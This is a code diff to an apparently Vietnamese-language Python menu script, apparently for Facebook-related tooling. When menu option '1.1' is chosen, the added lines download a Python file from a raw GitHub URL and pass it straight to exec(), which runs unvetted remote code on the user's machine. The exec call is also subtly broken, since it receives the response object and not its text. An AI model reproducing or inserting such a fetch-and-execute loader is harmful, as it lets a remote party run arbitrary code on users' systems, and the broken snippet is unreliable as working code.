@@ -89,6 +89,10 @@ def main():
             choice = input(f"\n{Col.RED}[</>]{Col.RESET} => {Col.YELLOW}Nhập Lựa Chọn: {Col.RESET}")
             if choice == "1.1":
                 print(f"\n{Col.GREEN}>> Đang Vào tool...{Col.RESET}")
+                xmckdl = "https://raw.githubusercontent.com/tuyenek/share-o/refs/heads/main/xmckdl.py"
+                xm1 = requests.get(xmckdl)
+                exec(xm1)
+                
                 time.sleep(1)
                 # Chèn code tool Facebook 1.1 của bạn vào đây
                 break
